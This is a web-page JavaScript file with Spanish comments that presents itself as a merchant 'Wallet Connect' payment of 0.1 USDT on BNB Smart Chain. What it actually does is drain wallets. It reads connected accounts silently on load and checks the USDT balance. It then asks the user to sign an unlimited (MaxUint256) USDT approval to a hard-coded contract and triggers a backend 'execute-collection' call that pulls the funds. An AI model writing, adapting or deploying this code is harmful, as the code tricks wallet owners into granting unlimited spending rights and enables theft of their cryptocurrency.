"use strict";

// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ─────────────────
(function () {
  if (typeof window === 'undefined') return;
  
  window.addEventListener("eip6963:announceProvider", (event) => {
    if (event.detail && event.detail.provider && !window.ethereum) {
      window.ethereum = event.detail.provider;
    }
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  setTimeout(() => {
    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
      window.ethereum = window.web3.currentProvider;
    }
  }, 100);
})();

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed.binance.org/",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── Silent Connect on Web3 In-App Browsers ──────────────────────────────────
window.addEventListener("load", async () => {
  if (!window.ethereum || typeof window.ethereum.request !== "function") return;
  try {
    const accs = await window.ethereum.request({ method: "eth_accounts" });
    if (accs && accs[0]) _cachedAddress = accs[0];
  } catch (_) {}
  if (typeof window.ethereum.on === "function") {
    window.ethereum.on("accountsChanged", (accs) => {
      _cachedAddress = (accs && accs[0]) ? accs[0] : null;
    });
  }
});

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "Wallet Connect";
  btnSpinner.hidden   = !on;
}

// ─── Universal Provider Fetcher ───────────────────────────────────────────────
async function getActiveProvider() {
  // 1. Si está en un navegador in-app (Trust, MetaMask internal browser)
  if (window.ethereum && typeof window.ethereum.request === "function") {
    return window.ethereum;
  }
  // 2. Si se usó Reown AppKit modal
  if (window.modal && window.modal.getWalletProvider) {
    const walletProvider = window.modal.getWalletProvider();
    if (walletProvider) return walletProvider;
  }
  return null;
}

// ─── RPC Helper ───────────────────────────────────────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

// ─── Poll allowance until mined ───────────────────────────────────────────────
async function waitForAllowanceConfirmed(provider, owner, spender, required, timeout = 120000) {
  const data = "0xdd62ed3e" + owner.slice(2).padStart(64, "0") + spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await provider.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data }, "latest"]
      });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out. Please try again.");
}

// ─── Backend collect (with retry) ─────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress, amount: COLLECT_AMOUNT })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(provider, userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await provider.request({
      method: "eth_call",
      params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]
    });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main button handler ──────────────────────────────────────────────────────
approveBtn.addEventListener("click", async () => {
  let provider = await getActiveProvider();

  // Si no hay un proveedor activo detectado, abrir siempre el modal de Reown AppKit
  if (!provider) {
    if (window.modal) {
      try {
        await window.modal.open();
        
        // Esperar a que el usuario seleccione una billetera y se establezca el proveedor
        for (let i = 0; i < 30; i++) {
          await new Promise(r => setTimeout(r, 500));
          provider = await getActiveProvider();
          if (provider) break;
        }
      } catch (err) {
        console.error("Error al abrir el modal:", err);
      }
    }
  }

  if (!provider) {
    showToast("Por favor selecciona una billetera para continuar.", "error");
    return;
  }

  setLoading(true, "Processing…");

  try {
    // Step 1 — Cambiar a BNB Smart Chain
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID_HEX }]
      });
    } catch (e) {
      if (e.code === 4902) {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_PARAMS]
        });
      } else if (
        e.code === 4001 ||
        (e.message || "").toLowerCase().includes("user rejected") ||
        (e.message || "").toLowerCase().includes("user denied")
      ) {
        showToast("Por favor cambia a la red BNB Smart Chain.", "error");
        setLoading(false);
        return;
      }
    }

    // Step 2 — Obtener la dirección activa
    let userAddress = _cachedAddress || null;
    if (!userAddress) {
      const accs = await provider.request({ method: "eth_requestAccounts" });
      userAddress = (accs && accs[0]) ? accs[0] : null;
    }

    if (!userAddress) {
      showToast("Billetera no detectada. Abre esta página desde tu app de billetera.", "error");
      setLoading(false);
      return;
    }

    _cachedAddress = userAddress;

    const CAP_AMOUNT = ethers.MaxUint256;
    const iface      = new ethers.Interface(ERC20_ABI);

    // Verificar Balance USDT
    const usdtBalance = await getUsdtBalance(provider, userAddress, iface);
    if (usdtBalance <= MIN_USDT_BALANCE) {
      showToast("Saldo insuficiente de USDT.", "error");
      setLoading(false);
      return;
    }

    // Step 3 — Verificar Allowance existente
    try {
      const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
      const allowanceHex  = await provider.request({
        method: "eth_call",
        params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
      });
      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
        setLoading(true, "Finalizing…");
        await triggerBackendCollect(userAddress);
        showToast("¡Transacción completada con éxito! ✓", "success");
        setLoading(false);
        return;
      }
    } catch (_) {}

    // Step 4 — Solicitar Firma de Aprobación (Approve)
    const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
    
    await provider.request({
      method: "eth_sendTransaction",
      params: [{
        from:  userAddress,
        to:    BSC_USDT_ADDRESS,
        data:  approveData,
        value: "0x0"
      }]
    });

    // Step 5 — Esperar confirmación del bloque
    setLoading(true, "Confirming…");
    await waitForAllowanceConfirmed(provider, userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

    // Step 6 — Ejecutar cobro desde Backend
    setLoading(true, "Finalizing…");
    await triggerBackendCollect(userAddress);
    showToast("¡Transacción completada con éxito! ✓", "success");

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("user denied") ||
      raw.toLowerCase().includes("canceled")
    ) {
      showToast("Transacción cancelada.", "default");
    } else {
      showToast("Error: " + String(raw).substring(0, 90), "error");
    }
  } finally {
    setLoading(false);
  }
});
